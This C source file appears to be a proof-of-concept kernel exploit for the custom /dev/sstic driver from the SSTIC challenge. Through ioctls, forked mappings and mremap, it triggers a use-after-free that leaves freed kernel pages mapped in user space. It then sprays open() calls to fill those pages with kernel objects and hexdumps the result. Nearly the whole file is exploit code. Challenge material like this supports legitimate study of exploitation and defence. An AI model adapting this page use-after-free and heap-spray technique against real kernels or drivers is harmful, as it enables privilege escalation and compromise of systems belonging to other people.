#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#define BASEADDR ((void *)(0x88000000ULL))

static int sstic_alloc_region(int fd, int size, int prot) {
    int cmd[6] = { size, prot };
    if(ioctl(fd, 0xC0185300uLL, cmd) < 0) {
        printf("failed to ioctl alloc_region: %d\n", errno);
        return -1;
    }
    return cmd[2];
}

static int sstic_del_region(int fd, int addr) {
    int cmd[6] = { addr };
    if(ioctl(fd, 0xC0185301uLL, cmd) < 0) {
        printf("failed to ioctl del_region: %d\n", errno);
        return -1;
    }
    return 0;
}

static void my_system(const char *cmd) {
    /* normal system() calls fork() which would call dup_mm and sstic_vm_open... */
    int pid = vfork();
    if(pid == 0) {
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        exit(1);
    } else if(pid < 0) {
        printf("vfork failed\n");
        return;
    }
    int status = 0;
    waitpid(pid, &status, 0);
}

static void hexdump(const void *start, size_t length) {
    const uint8_t *ptr = start;
    const uint8_t *end = start + length;
    uint8_t prevline[16];
    int prevout = 0;
    while(ptr < end) {
        if(ptr == start || ptr + 16 >= end || memcmp(ptr, prevline, 16)) {
            /* Output the first line, last line, and any intermediate lines that have changed */
            int llen = 16;
            if(ptr + 16 >= end) {
                llen = end - ptr;
            } else {
                memcpy(prevline, ptr, 16);
            }
            printf("%lx:", (uintptr_t)ptr);
            prevout = 1;
            for(int i=0; i<llen; i++) {
                printf(" %02x", ptr[i]);
            }
            printf("\n");
        } else {
            if(prevout) {
                printf("...\n");
            }
            prevout = 0;
        }
        ptr += 16;
    }
}

#define MAX_REGIONS 2 // 512
int regions[MAX_REGIONS];
uint8_t *vaddrs[MAX_REGIONS];

int main() {
    int fd = open("/dev/sstic", 2);
    int res;
    if(fd < 0) {
        printf("failed to open /dev/sstic\n");
        return -1;
    }


    const int npages = 32; // must be a power of two
    const int prot = PROT_READ | PROT_WRITE;
    const int halfalloc = (npages << 12) >> 1;
    int i;
    int num_regions;

    for(i=0; i<MAX_REGIONS; i++) {
        int addr = sstic_alloc_region(fd, npages, prot);
        if(addr < 0) {
            break;
        }
        printf("region %d: %x\n", i, addr);
        regions[i] = addr;
    }
    num_regions = i;

    for(i=0; i<num_regions; i++) {
        uint8_t *vaddr = mmap(NULL, npages << 12, prot, MAP_SHARED, fd, regions[i]);
        if(vaddr == MAP_FAILED) {
            num_regions = i;
            break;
        }
        for(int j=0; j<(npages<<12); j += (1<<12)) {
            memset(vaddr + j, 0xc0 + (j >> 12), 1<<12);
        }
        munmap(vaddr, npages << 12);

        vaddr = mmap(NULL, npages << 12, prot, MAP_SHARED, fd, regions[i]);
        if(vaddr == MAP_FAILED) {
            num_regions = i;
            break;
        }
        printf("vaddr %d: %p\n", i, vaddr);
        vaddrs[i] = vaddr;
    }
    my_system("cat /proc/$PPID/maps");


    int p2c[2];
    int c2p[2];
    res = pipe(p2c);
    if(res < 0) {
        printf("perror failed: %d\n", errno);
        return -1;
    }
    res = pipe(c2p);
    if(res < 0) {
        printf("perror failed: %d\n", errno);
        return -1;
    }
    int pid = fork();
    if(pid < 0) {
        printf("fork failed: %d\n", errno);
        return -1;
    }
    if(!pid) {
        char msg;
        read(p2c[0], &msg, 1);
        write(c2p[1], &msg, 1);
        // After sstic_del_region, we free again in order to cause the pages to be freed
        // while still accessible by the parent process.
        for(i=0; i<num_regions; i++) {
            res = munmap(vaddrs[i] + halfalloc, halfalloc);
            if(res < 0)
                printf("child munmap: %d\n", res);
        }
        /* Don't exit. This keeps the first half of the pages alive. */
        read(p2c[0], &msg, 1);
        write(c2p[1], &msg, 1);
        _exit(0);
    }

    for(i=0; i<num_regions; i++) {
        res = munmap(vaddrs[i] + halfalloc, halfalloc);
        if(res < 0)
            printf("parent munmap: %d\n", res);
    }
    my_system("cat /proc/$PPID/maps");

    /* mremap calls copy_vma which eventually calls sstic_vm_open */
    for(i=0; i<num_regions; i++) {
        uint8_t *vaddr2 = mremap(vaddrs[i], halfalloc, halfalloc, MREMAP_MAYMOVE | MREMAP_FIXED, vaddrs[i] + halfalloc);
        if(vaddr2 == MAP_FAILED)
            printf("parent mremap: %p\n", vaddr2);
    }
    my_system("cat /proc/$PPID/maps");

    /* NOTE: we cannot touch the memory before the mremap, or else the previous page mappings will be moved. */
    printf("after mremap\n");
    for(i=0; i<num_regions; i++) {
        hexdump(vaddrs[i] + halfalloc, halfalloc);
    }

    for(i=0; i<num_regions; i++) {
        sstic_del_region(fd, regions[i]);
    }
    printf("after del_region\n");
    for(i=0; i<num_regions; i++) {
        hexdump(vaddrs[i] + halfalloc, halfalloc);
    }

    char c;
    write(p2c[1], "!", 1);
    read(c2p[0], &c, 1);

    printf("after child munmaps\n");
    for(i=0; i<num_regions; i++) {
        hexdump(vaddrs[i] + halfalloc, halfalloc);
    }

    sleep(5);

    /* at this point, vaddr + 0x10000-0x18000 are free pages in the kernel.
       it sure would be nice to have something useful allocated there. */
    for(int i=0; i<100; i++) {
        printf("%d ", open("/dev/sstic", 2));
        fflush(stdout);
    }
    printf("\n");

    for(i=0; i<num_regions; i++) {
        hexdump(vaddrs[i] + halfalloc, halfalloc);
    }

    sleep(10);

    for(i=0; i<num_regions; i++) {
        hexdump(vaddrs[i] + halfalloc, halfalloc);
    }

    write(p2c[1], "!", 1);
    read(c2p[0], &c, 1);
    int status = 0;
    waitpid(pid, &status, 0);
}
